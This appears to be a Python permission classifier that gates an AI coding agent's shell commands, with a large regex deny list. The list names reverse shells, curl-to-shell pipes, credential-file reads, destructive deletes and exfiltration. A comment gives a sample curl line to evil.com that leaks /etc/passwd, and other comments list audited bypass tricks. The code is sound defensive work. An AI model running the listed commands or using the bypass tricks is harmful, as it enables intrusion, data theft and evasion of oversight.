"""Permission classification pipeline (Pattern #10).

Implements the 6-layer defense from Giải phẫu §5:

    Layer 1  Safe tool allowlist          → skip → allow
    Layer 2  Permission mode              → plan/default/acceptEdits/bypass/auto/bubble
    Layer 3  Rule matching (user rules)   → allow / deny / ask
    Layer 4  Dangerous patterns           → strip unsafe rules, force deny
    Layer 5  Command security (AST-ish)   → block suspicious bash constructs
    Layer 6  Denial tracking              → anti-fatigue fallback

This is a static overlay: we cannot actually parse bash AST in pure Python
without bringing a heavy dependency, so Layer 5 uses vetted regexes for the
*documented* attack surface (heredoc with ``$()``, Zsh ``=cmd`` expansion,
command substitution, null-byte sentinels, base64-decode-then-exec, etc.).
The list is conservative: we *over-block* rather than let a bypass through.

Known limitations are documented in ``references/10-permission-classification.md``
and covered by ``tests/test_permission_engine.py``.
"""
from __future__ import annotations

import re
import shlex
from dataclasses import dataclass, field
from typing import Dict, Iterable, List, Optional, Tuple

from .denial_store import DenialStore

# ---------------------------------------------------------------------------
# Mode definitions (Claude Code §5.4)
# ---------------------------------------------------------------------------

PermissionMode = str  # "plan" | "default" | "accept_edits" | "bypass" | "auto" | "bubble"

MODES = ("plan", "default", "accept_edits", "bypass", "auto", "bubble")

# ---------------------------------------------------------------------------
# Classification
# ---------------------------------------------------------------------------

ClassName = str  # "read_only" | "verify" | "mutation" | "high_risk" | "blocked"

READ_ONLY_PREFIXES = (
    "ls", "cat", "head", "tail", "wc", "pwd", "whoami", "env", "id", "uname",
    "git status", "git log", "git diff", "git show", "git branch", "git rev-parse",
    "git ls-files", "git ls-tree", "git describe", "git config --get",
    "rg", "grep", "find", "fd", "tree", "stat", "file", "du", "df",
    "echo", "printf",
)

VERIFY_PREFIXES = (
    "pytest", "npm test", "yarn test", "pnpm test", "jest", "vitest", "mocha",
    "cargo test", "cargo check", "cargo clippy",
    "npm run lint", "yarn lint", "pnpm lint",
    "npm run typecheck", "tsc --noemit", "tsc -p",
    "mypy", "pyright", "ruff", "eslint", "stylelint",
    "go test", "go vet",
    "mvn test", "gradle test",
)

MUTATION_PREFIXES = (
    "git add", "git commit", "git tag", "git checkout", "git switch",
    "mkdir", "touch", "cp", "mv", "echo >",
)

# ---------------------------------------------------------------------------
# Layer 4 — DANGEROUS patterns (cross-platform code execution & destructive ops)
# ---------------------------------------------------------------------------
# Keep each entry tight but conservative; prefer over-blocking.

_DANGEROUS_PATTERNS: List[Tuple[str, str]] = [
    # -- Destructive filesystem ------------------------------------------------
    # Matches rm with any combined flag order containing r/R and f/F (e.g. -rf, -fr, -Rfv, -rfv, -fvr, -RFv, --recursive --force).
    (r"(^|[\s;&|`])(/[\w./-]+/)?rm\s+(-[a-zA-Z]*[rR][a-zA-Z]*[fF][a-zA-Z]*|-[a-zA-Z]*[fF][a-zA-Z]*[rR][a-zA-Z]*|--recursive\b[^\n]*--force|--force\b[^\n]*--recursive)",
     "destructive recursive delete"),
    (r"(^|[\s;&|`])(/[\w./-]+/)?rm\s+[\"']?/[\"']?(\s|$)", "destructive delete at root"),
    (r"\bfind\s+[^|]*-delete\b", "find -delete mass deletion"),
    (r"\bfind\s+[^|]*-exec\s+rm\b", "find -exec rm mass deletion"),
    (r"\bmkfs(\.[a-z0-9]+)?\b", "filesystem format"),
    (r"\bdd\b[^|]*\bof=/", "raw disk write to /"),
    (r"\bshred\b", "shred wipe"),
    (r":\(\)\s*\{\s*:\|:&\s*\}\s*;", "fork bomb"),
    # -- Sensitive-path read / tamper (read-only tools can still exfiltrate) --
    (r"(^|[\s;&|`<>])(/etc/(passwd|shadow|sudoers|gshadow|group|hosts)|/root(/\S*)?|/proc/self/(environ|mem)|~?/\.bash_history|~?/\.zsh_history|~?/\.ssh/(id_[a-z0-9_]+|known_hosts|authorized_keys)|~?/\.aws/credentials|~?/\.docker/config\.json|~?/\.kube/config|~?/\.netrc)(\s|$|[\"';:,\|&])",
     "sensitive system/user path"),
    # -- Writes via redirect / tee to arbitrary system paths ------------------
    (r"(^|[\s;&|`])>>?\s*(/etc/|/var/|/usr/|/root/|/boot/|/sys/|/proc/)",
     "redirect to system path"),
    (r"\btee\s+(-a\s+)?(/etc/|/var/|/usr/|/root/|/boot/|/sys/|/proc/)",
     "tee to system path"),
    # -- System-administration + service / firewall / kernel commands --------
    (r"(^|[\s;&|`])(chown|chmod)\s+[^\n]*\s(/etc/|/var/|/usr/|/root/|/boot/)",
     "chown/chmod on system path"),
    (r"(^|[\s;&|`])(mount|umount)\s+", "mount/umount operation"),
    (r"(^|[\s;&|`])iptables\s+", "iptables firewall change"),
    (r"(^|[\s;&|`])(systemctl\s+(stop|start|restart|disable|enable|mask|unmask|daemon-reload)\b|service\s+\S+\s+(stop|start|restart|reload)\b)",
     "systemctl/service state change"),
    (r"(^|[\s;&|`])(killall|pkill)\b", "mass kill"),
    (r"(^|[\s;&|`])crontab\s+-r\b", "crontab wipe"),
    (r"(^|[\s;&|`])(useradd|userdel|groupadd|groupdel|usermod)\s+", "user account mutation"),
    (r"(^|[\s;&|`])passwd\b", "password change"),
    # -- Symlink attack into sensitive paths ----------------------------------
    (r"\bln\s+-s\s+(/etc/|/var/|/usr/|/root/|/boot/|~/\.ssh/|~/\.aws/|~/\.kube/)",
     "symlink pointing at sensitive path"),
    # -- Tar / unzip extract to root ------------------------------------------
    (r"\b(tar|bsdtar)\b[^|\n]*\s-C\s+/(\s|$)", "tar extract to /"),
    (r"\bunzip\b[^|\n]*\s-d\s+/(\s|$)", "unzip extract to /"),
    # -- Command substitution / process substitution containing network tools -
    (r"\$\(\s*(curl|wget|fetch|nc|ncat|socat)\b", "$(...) wrapping network tool"),
    (r"`\s*(curl|wget|fetch|nc|ncat|socat)\b", "backtick wrapping network tool"),
    (r"<\(\s*(curl|wget|fetch)\b", "<(curl) process substitution"),
    # -- Remote code execution -------------------------------------------------
    (r"\|\s*(bash|sh|zsh|fish|tcsh|ksh|csh|dash|python3?|ruby|perl|php|lua|node|deno|tsx)\b", "pipe to interpreter"),
    (r"\beval\s+[\"`\$]", "eval of dynamic string"),
    (r"\bcurl\b[^|&;`]*\|\s*[a-z]", "curl piped to shell"),
    (r"\bwget\b[^|&;`]*\|\s*[a-z]", "wget piped to shell"),
    (r"\bbase64\s+-d\b[^|&;`]*\|\s*(bash|sh|zsh|python|node)", "base64 decode piped to interpreter"),
    (r"\bssh\b[^\n]*\s(-[tT]|--tty)\b", "interactive ssh spawn"),
    # -- Privilege escalation --------------------------------------------------
    (r"(^|[\s;&|`])sudo\b(?!\s+-n\s+-l\b)", "sudo privilege escalation"),
    (r"\bsetcap\b", "setcap capability change"),
    (r"\bchmod\s+[ugoa]*[+=]s\b", "setuid/setgid bit"),
    # -- Git history / force push / worktree force ----------------------------
    (r"\bgit\s+push\b[^;&|`]*\s--force(?!-with-lease)", "git push --force"),
    (r"\bgit\s+push\b[^;&|`\n]*\s-f(\s|$)", "git push -f"),
    (r"\bgit\s+push\s+[^\s]+\s+:", "git push delete remote branch"),
    (r"\bgit\s+reset\s+--hard\b", "git reset --hard"),
    (r"\bgit\s+clean\s+-[a-zA-Z]*[fdx]", "git clean destructive"),
    (r"\bgit\s+filter-branch\b", "git filter-branch history rewrite"),
    (r"\bgit\s+rebase\s+-i\b", "git interactive rebase"),
    (r"\bgit\s+worktree\s+remove\b[^\n]*--force", "git worktree remove --force"),
    # -- Kubernetes / Terraform / Cloud ---------------------------------------
    (r"\bkubectl\s+(delete|apply|rollout|scale|patch|drain|cordon|replace)\b", "kubectl mutating op"),
    (r"\bhelm\s+(delete|uninstall|rollback|upgrade|install)\b", "helm mutating op"),
    (r"\bterraform\s+(apply|destroy|taint|untaint|state)\b", "terraform mutating op"),
    (r"\bansible(-playbook)?\b[^\n]*--become\b", "ansible privilege escalation"),
    (r"\baws\s+[a-z0-9-]+\s+(delete|rm|remove|terminate)\b", "aws destructive call"),
    (r"\baws\s+s3\s+rb\b", "aws s3 rb bucket delete"),
    (r"\bgcloud\b[^\n]*\bdelete\b", "gcloud destructive call"),
    (r"\baz\b[^\n]*\bdelete\b", "azure cli destructive call"),
    # -- Containers ------------------------------------------------------------
    (r"\bdocker\s+(rm|kill|prune|system\s+prune|volume\s+rm|network\s+rm)\b", "docker destructive op"),
    (r"\bdocker-compose\s+down\b[^\n]*(-v|--volumes)", "docker-compose down -v"),
    # -- Databases -------------------------------------------------------------
    (r"\bDROP\s+(TABLE|DATABASE|SCHEMA|INDEX)\b", "SQL drop"),
    (r"\bTRUNCATE\s+TABLE\b", "SQL truncate"),
    (r"\bDELETE\s+FROM\b(?![^\n]*\bWHERE\b)", "SQL delete without WHERE"),
    (r"\b(prisma|knex|alembic|sequelize|typeorm|drizzle)\s+(migrate|migration|db)\s+(deploy|reset|up|down|push|drop)\b",
     "database migration run"),
    (r"\b(npm|yarn|pnpm)\s+run\s+db:(migrate|reset|drop|push|seed)\b", "db script mutation"),
    # -- Package management ----------------------------------------------------
    (r"\b(npm|yarn|pnpm|bun)\s+(install|add|remove|uninstall)\b", "package install/remove"),
    (r"\bpip3?\s+install\b", "pip install"),
    (r"\bcargo\s+(add|remove|install)\b", "cargo install"),
    (r"\bgem\s+install\b", "gem install"),
    (r"\bapt(-get)?\s+(install|remove|purge|upgrade)\b", "apt install"),
    (r"\bbrew\s+(install|uninstall|upgrade)\b", "brew install"),
    # -- Secrets ---------------------------------------------------------------
    (r"(^|[\s/'\"])\.env($|[\s\"':])", "env file access"),
    (r"(^|[\s/'\"])\.env\.(local|development|production|staging|prod|dev|test)(\b|$|[\s\"':])", "env.* file access"),
    (r"\b(AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|GITHUB_TOKEN|OPENAI_API_KEY|ANTHROPIC_API_KEY)\b", "secret env name"),
    (r"(^|[\s'\"])~?/?\.aws/credentials\b", "aws credentials file"),
    (r"(^|[\s'\"])~?/?\.ssh/id_[a-z0-9]+\b", "ssh private key"),
    # -- Shell injection / Zsh exploits (Giải phẫu §5.7) ----------------------
    (r"=\(\s*[^)]+\)", "Zsh equals-paren array construction"),
    (r"\b=curl\b|\b=wget\b|\b=python\b|\b=node\b", "Zsh equals-expansion"),
    (r"<<\s*[\"']?[A-Z_]+[\"']?\s*\n[^\n]*\$\(", "heredoc with command substitution"),
    (r"\bzmodload\b", "Zsh zmodload"),
    (r"\bsysopen\b|\bsyswrite\b|\bzf_(rm|mv|cp|mkdir|rmdir)\b|\bzpty\b|\bztcp\b", "Zsh dangerous builtin"),
    # -- Deploy / release ------------------------------------------------------
    (r"\b(vercel|netlify|fly|heroku|railway)\s+deploy\b", "PaaS deploy"),
    (r"\bserverless\s+deploy\b", "serverless deploy"),
    # -- v0.10.4 — 11 bypass vectors from audit -------------------------------
    # (1) $(...) / backtick / <(...) wrapping destructive ops (was only caught
    #     for curl/wget; now also for rm/dd/mkfs/shred/etc).
    (r"\$\(\s*(rm|dd|mkfs|shred|find|sudo|chmod\s+[ugoa]*[+=]s)\b",
     "$(...) wrapping destructive tool"),
    (r"`\s*(rm|dd|mkfs|shred|find|sudo|chmod\s+[ugoa]*[+=]s)\b",
     "backtick wrapping destructive tool"),
    (r"<\(\s*(rm|dd|mkfs|shred|find|curl|wget|sudo)\b",
     "<(...) process substitution with dangerous tool"),
    # (2) python/perl/ruby/node/php/lua -c|-e|-r with dangerous keyword (e.g.
    #     os.system, shutil.rmtree, unlink, rmdir, subprocess, exec, eval).
    (r"\b(python3?|perl|ruby|node|nodejs|deno|php|lua|tsx)\s+-[ceErP]\b[^\n]*"
     r"(os\.system|os\.(remove|unlink|rmdir)|shutil\.rmtree|subprocess|"
     r"system\b|unlink\b|rmdir\b|rmSync\b|rm_rf|Dir\.(delete|rmdir)|"
     r"File\.delete|exec\b|eval\b|require\(['\"](?:child_process|fs)['\"])",
     "interpreter -c/-e with dangerous call"),
    # (3) bash -c / sh -c / zsh -c / dash -c with any string argument — too
    #     much attack surface; force the user to ask.  (Safe lint/test
    #     commands rarely need `bash -c`.)
    (r"\b(bash|sh|zsh|dash|ksh|tcsh|fish)\s+-c\s+[\"'$]",
     "shell -c inline script"),
    # (4) IFS= / variable-assignment trick to smuggle dangerous tokens.
    (r"(^|[\s;&|])IFS\s*=", "IFS separator override"),
    # (5) Variable-expansion payload (``a=rm; b=-rf ...; $a $b``) — detect
    #     explicit assignments followed by indirect expansion.
    (r"^\s*[a-zA-Z_][a-zA-Z0-9_]*\s*=\s*(rm|dd|mkfs|shred)\b",
     "variable-expansion smuggling of destructive tool"),
    # (6) `source` / `.` of an untrusted path (/tmp, /dev/shm, user home
    #     caches) — arbitrary code execution disguised as config load.
    (r"(^|[\s;&|])(source|\.)\s+(/tmp/|/dev/shm/|~?/\.cache/|~?/Downloads/)",
     "source/.  of untrusted path"),
    # (7) Pipe / redirect to block devices.
    (r">\s*/dev/(sd[a-z][0-9]*|nvme\d+n\d+(p\d+)?|hd[a-z][0-9]*|disk\d+|vd[a-z]|xvd[a-z])\b",
     "write to block device"),
    (r"\bdd\b[^\n]*\bof=/dev/(sd|nvme|hd|disk|vd|xvd)",
     "dd to block device"),
    # (8) Kernel runtime tamper via /proc or /sys write.
    (r">\s*/proc/sys/", "write to /proc/sys kernel tunable"),
    (r">\s*/sys/(kernel|module|firmware)/", "write to /sys kernel path"),
    # (9) ``xargs`` dispatching ``rm`` / ``shred`` — defeats the single-command
    #     regex because ``xargs rm`` looks benign after the pipe.
    (r"\|\s*xargs\b[^\n]*\b(rm|shred|unlink)\b",
     "xargs dispatching destructive tool"),
    # (10) Library-hijack via ``ldconfig -C`` or ``LD_PRELOAD=``.
    (r"\bldconfig\b[^\n]*\s-C\s", "ldconfig custom cache hijack"),
    (r"(^|[\s;&|])LD_PRELOAD\s*=", "LD_PRELOAD library hijack"),
    (r"(^|[\s;&|])LD_LIBRARY_PATH\s*=\s*(/tmp/|/dev/shm/|~?/\.cache/)",
     "LD_LIBRARY_PATH from untrusted location"),
    # (11) ``exec`` replacement of the shell with a destructive tool.
    (r"(^|[\s;&|])exec\s+(rm|dd|mkfs|shred|curl|wget|bash|sh)\b",
     "exec replacement with dangerous tool"),
    # -- v0.10.5 — audit follow-up: 3 more bypass families -------------------
    # (12) ``rm`` with separate ``-r`` and ``-f`` flags (``rm -r -f /``,
    #      ``rm -r -f -v ~/*``).  The v0.10.4 regex only caught combined
    #      flags (``-rf``, ``-fr``, ``-Rfv``).  Here we require *some*
    #      recursive flag (``-r``/``-R``/``--recursive``) AND some force
    #      flag (``-f``/``--force``) appearing anywhere in the same
    #      sub-command, then block.
    (r"(^|[\s;&|`])rm\b(?=[^\n;&|]*\s-[a-zA-Z]*[rR]\b)"
     r"(?=[^\n;&|]*\s-[a-zA-Z]*[fF]\b)",
     "destructive recursive delete (separate flags)"),
    (r"(^|[\s;&|`])rm\b(?=[^\n;&|]*\s--recursive\b)"
     r"(?=[^\n;&|]*\s--force\b)",
     "destructive recursive delete (long-form flags)"),
    # (13) Reverse-shell patterns.
    (r"\bnc(at)?\b[^\n]*\s-[a-zA-Z]*[ec]\b", "netcat reverse shell (-e/-c)"),
    (r"\bbash\b[^\n]*\s-[a-zA-Z]*i[a-zA-Z]*\b[^\n]*>&\s*/dev/tcp/",
     "bash -i reverse shell to /dev/tcp"),
    (r">&\s*/dev/(tcp|udp)/", "redirect to /dev/tcp /dev/udp (reverse shell)"),
    (r"<>\s*/dev/(tcp|udp)/", "bidir redirect to /dev/tcp /dev/udp"),
    (r"\bsocat\b[^\n]*\bEXEC\s*:", "socat EXEC: reverse shell"),
    (r"\b(python3?|perl|ruby|php|node)\b[^\n]*socket\.socket[^\n]*connect",
     "scripted socket reverse shell"),
    # (14) Data-exfiltration via curl/wget POST of a local file.
    (r"\bcurl\b[^\n]*\s(-d|--data|--data-binary|--data-raw|--upload-file)\s+[\"']?@?(/etc/|/root/|~/\.ssh|~/\.aws|/var/log/)",
     "curl exfiltration of sensitive local file"),
    (r"\bcurl\b[^\n]*\s-T\s+(/etc/|/root/|~/\.ssh|~/\.aws|/var/log/)",
     "curl -T upload of sensitive file"),
    (r"\bwget\b[^\n]*\s--post-file=[\"']?(/etc/|/root/|~/\.ssh|~/\.aws|/var/log/)",
     "wget --post-file of sensitive file"),
    (r"\bscp\b[^\n]*\s(/etc/(passwd|shadow|sudoers)|~?/\.ssh/|~?/\.aws/)[^\n]*\s[^@\s:]+@",
     "scp exfil of sensitive file to remote host"),
    (r"\brsync\b[^\n]*\s(/etc/(passwd|shadow|sudoers)|~?/\.ssh/|~?/\.aws/)[^\n]*\s[^@\s:]+@",
     "rsync exfil of sensitive file to remote host"),
    # -- v0.11.0 audit follow-up — 4 edge cases flagged by tester ------------
    # (15) curl/wget using $(...) / backtick to exfil sensitive file contents
    #      via URL path.  Example: `curl https://evil.com/$(cat /etc/passwd)`.
    (r"\b(curl|wget|fetch)\b[^\n]*(\$\(|`)\s*(cat|head|tail|base64|xxd)\b[^\n]*(/etc/|/root/|~?/\.ssh|~?/\.aws|~?/\.env)",
     "curl/wget $(cat sensitive) URL smuggling"),
    (r"\b(curl|wget|fetch)\b[^\n]*(\$\(|`)[^\n]*(passwd|shadow|sudoers|id_[a-z0-9_]+|credentials)",
     "curl/wget $(...) wrapping sensitive-path tool"),
    # (16) HTTP Authorization header / secret literal in a network egress call.
    (r"\b(curl|wget|fetch|http(ie)?)\b[^\n]*-H\s+[\"']?Authorization:\s*(Bearer|Basic|Token)\s+\S+",
     "network call with explicit Authorization header/token"),
    (r"\b(curl|wget|fetch|http(ie)?)\b[^\n]*\b(sk-[A-Za-z0-9_-]{8,}|ghp_[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16}|xox[baprs]-[A-Za-z0-9-]+)\b",
     "network call with inline API token/secret literal"),
    # (17) git push --delete <branch> variants (tester M4).  The existing
    #      `git push <remote> :branch` regex only catches the colon-refspec
    #      form.  Here we also catch explicit `--delete` forms.
    (r"\bgit\s+push\b[^;&|`\n]*\s--delete\b", "git push --delete remote branch"),
    (r"\bgit\s+push\b[^;&|`\n]*\s-d\s", "git push -d remote branch"),
    # (18) Modern Python package managers missed by the npm/pip list.
    (r"\bpipx\s+(install|inject|upgrade|uninstall)\b", "pipx install/uninstall"),
    (r"\buv\s+(pip\s+install|pip\s+uninstall|add|remove|sync)\b", "uv pip install/uninstall"),
    (r"\bpoetry\s+(add|remove|install|update)\b", "poetry install/uninstall"),
    (r"\bconda\s+(install|remove|update)\b", "conda install/uninstall"),
]

_COMPILED_DANGEROUS = [(re.compile(p), reason) for p, reason in _DANGEROUS_PATTERNS]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _split_commands(cmd: str) -> List[str]:
    """Split a compound command on ``;``, ``&&``, ``||``, ``|`` while respecting quotes."""
    # Not a full bash parser — but shlex handles quoted strings, and we only
    # split on unquoted separators.  Good enough for the classifier.
    try:
        tokens = shlex.split(cmd, posix=True)
    except ValueError:
        # Unbalanced quotes ⇒ treat the whole thing as one command string.
        return [cmd]
    # Re-assemble into a list of sub-commands using unquoted separators.
    out: List[List[str]] = [[]]
    seps = {";", "&&", "||", "|", "&"}
    for t in tokens:
        if t in seps:
            out.append([])
        else:
            out[-1].append(t)
    return [" ".join(parts) for parts in out if parts]


def _startswith_any(s: str, prefixes: Iterable[str]) -> bool:
    s_l = s.lstrip()
    return any(s_l == p or s_l.startswith(p + " ") or s_l.startswith(p + "\t") for p in prefixes)


def _normalise_unicode(text: str) -> str:
    """Normalise Unicode homoglyphs that could bypass regex matching.

    v0.10.4: an attacker could write ``rm \u2212rf /`` (U+2212 MINUS SIGN)
    and ``\\brm\\s+-[a-zA-Z]*r`` would fail to match because U+2212 is not
    ``-``.  NFKC folds full-width, small-form, and math variants to ASCII;
    we additionally map the common dash-like codepoints (U+2010..U+2015,
    U+2212, U+FE58, U+FF0D) to ASCII ``-``.

    v0.11.4 P3-3: strip all characters in Unicode category ``Cf``
    (format / zero-width: U+200B ZWS, U+200C ZWNJ, U+200D ZWJ,
    U+FEFF BOM, U+2060 WORD JOINER, U+00AD SOFT HYPHEN, and
    others).  Inserting any of these between keyword characters
    used to keep the command visually identical while preventing
    regex matches (e.g. ``rm\\u200b -rf /`` would previously
    classify as ``mutation`` because ``\\brm\\b`` requires a word
    boundary on both sides and ZWS is neither ``\\w`` nor ``\\W``
    for Python's regex engine in all versions).  Stripping Cf
    before substring/regex matching closes that bypass lane
    without damaging user-visible content — format chars carry
    no meaning in shell lexing.
    """
    import unicodedata
    normalised = unicodedata.normalize("NFKC", text)
    # Strip format-category codepoints first so subsequent regex
    # matching sees a contiguous shell token.
    stripped = "".join(ch for ch in normalised
                       if unicodedata.category(ch) != "Cf")
    dashes = "\u2010\u2011\u2012\u2013\u2014\u2015\u2212\ufe58\uff0d"
    trans = {ord(c): ord("-") for c in dashes}
    return stripped.translate(trans)


def classify_cmd(cmd: str) -> Tuple[ClassName, str]:
    """Return ``(class, reason)`` for a shell command.

    The worst class among sub-commands wins.  Ordering:
        blocked  >  high_risk  >  mutation  >  verify  >  read_only
    """
    # v0.10.4: fold Unicode homoglyphs so ``rm −rf /`` (U+2212) matches.
    text = _normalise_unicode(cmd).strip()
    if not text:
        return "blocked", "empty command"

    # Layer 4 — DANGEROUS patterns on the raw command
    for rx, reason in _COMPILED_DANGEROUS:
        if rx.search(text):
            return "blocked", reason

    subs = _split_commands(text)
    worst: Tuple[int, ClassName, str] = (0, "read_only", "default")
    rank = {"read_only": 0, "verify": 1, "mutation": 2, "high_risk": 3, "blocked": 4}
    for sub in subs:
        for rx, reason in _COMPILED_DANGEROUS:
            if rx.search(sub):
                return "blocked", reason
        if _startswith_any(sub, READ_ONLY_PREFIXES):
            c, r = "read_only", "known safe read"
        elif _startswith_any(sub, VERIFY_PREFIXES):
            c, r = "verify", "lint/test/build"
        elif _startswith_any(sub, MUTATION_PREFIXES):
            c, r = "mutation", "file/VCS mutation"
        else:
            c, r = "mutation", "unknown command (assumed mutation)"
        if rank[c] > rank[worst[1]]:
            worst = (rank[c], c, r)
    return worst[1], worst[2]


# ---------------------------------------------------------------------------
# Decision
# ---------------------------------------------------------------------------


@dataclass
class Decision:
    decision: str  # "allow" | "ask" | "deny"
    cls: ClassName
    reason: str
    mode: PermissionMode
    prior: Optional[dict] = None
    extra: Dict[str, object] = field(default_factory=dict)

    def to_dict(self) -> dict:
        d = {"decision": self.decision, "class": self.cls, "reason": self.reason, "mode": self.mode}
        if self.prior:
            d["prior"] = self.prior
        if self.extra:
            d["extra"] = self.extra
        return d


def decide(
    cmd: str,
    mode: PermissionMode = "default",
    root: str = ".",
    rules: Optional[List[Dict[str, str]]] = None,
    allow_unsafe_yolo: bool = False,
) -> Dict[str, object]:
    """Return a decision dict; also records denials in the store.

    ``rules``: optional list of user rules like
    ``[{"type":"exact","command":"npm test","decision":"allow"}]``.
    """
    if mode not in MODES:
        mode = "default"
    cls, reason = classify_cmd(cmd)
    store = DenialStore(root)

    # Layer 6 — circuit breaker: fall back to asking the user if too many denials.
    if store.should_fallback_to_user() and cls != "blocked":
        dec = Decision("ask", cls, "denial fatigue circuit breaker", mode)
        return dec.to_dict()

    # Prior denial for this exact command (≥ 2 prior denials)
    prior = store.denied_before(cmd)
    if prior:
        dec = Decision("deny", cls, "repeated denial within TTL", mode, prior=prior)
        return dec.to_dict()

    # Layer 4 — dangerous patterns always deny (even under bypass/yolo unless --unsafe).
    if cls == "blocked":
        if mode == "bypass" and allow_unsafe_yolo:
            return Decision("allow", cls, reason + " (bypass --unsafe override)", mode).to_dict()
        store.record_denial(cmd, reason)
        return Decision("deny", cls, reason, mode).to_dict()

    # Layer 3 — user rules
    if rules:
        for rule in rules:
            if _rule_matches(rule, cmd):
                d = rule.get("decision", "allow")
                return Decision(d, cls, f"rule:{rule.get('type')}:{rule.get('command') or rule.get('pattern') or ''}", mode).to_dict()

    # Layer 2 — modes
    if mode == "plan":
        if cls in ("read_only", "verify"):
            return Decision("allow", cls, reason, mode).to_dict()
        return Decision("deny", cls, "plan mode: write/mutation forbidden", mode).to_dict()

    if cls == "read_only":
        return Decision("allow", cls, reason, mode).to_dict()

    if cls == "verify":
        return Decision("allow", cls, reason, mode).to_dict()

    if mode == "accept_edits":
        if cls == "mutation":
            return Decision("allow", cls, "accept_edits auto-approves file edits", mode).to_dict()
        return Decision("ask", cls, "accept_edits asks for non-edit mutation", mode).to_dict()

    if mode == "bypass":
        return Decision("allow", cls, "bypass mode (dangerous already filtered)", mode).to_dict()

    if mode == "auto":
        # YOLO classifier in Claude Code; here we keep mutation behind "ask" by default,
        # but allow verify-like commands to pass.
        return Decision("ask", cls, "auto mode defers mutation to user", mode).to_dict()

    if mode == "bubble":
        # Sub-agent mode: escalate to parent by asking.
        return Decision("ask", cls, "bubble: escalate to coordinator", mode).to_dict()

    # default → ask
    return Decision("ask", cls, reason, mode).to_dict()


def _rule_matches(rule: Dict[str, str], cmd: str) -> bool:
    """Implement exact / prefix / wildcard rule matching (Giải phẫu §5.5)."""
    rtype = rule.get("type")
    if rtype == "exact":
        return cmd.strip() == rule.get("command", "").strip()
    if rtype == "prefix":
        p = rule.get("prefix", "")
        return cmd.strip() == p or cmd.strip().startswith(p + " ") or cmd.strip().startswith(p + ":")
    if rtype == "wildcard":
        import fnmatch
        return fnmatch.fnmatchcase(cmd.strip(), rule.get("pattern", ""))
    return False


# ---------------------------------------------------------------------------
# CLI (invoked by /vibe-permission)
# ---------------------------------------------------------------------------
def _main() -> None:
    import argparse, json as _json
    ap = argparse.ArgumentParser(description="Classify a shell command.")
    ap.add_argument("command")
    ap.add_argument("--mode", default="default", choices=MODES)
    ap.add_argument("--root", default=".")
    ap.add_argument("--unsafe", action="store_true",
                    help="Required to let 'bypass' mode override dangerous patterns.")
    args = ap.parse_args()
    result = decide(args.command, mode=args.mode, root=args.root, allow_unsafe_yolo=args.unsafe)
    print(_json.dumps(result, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    _main()
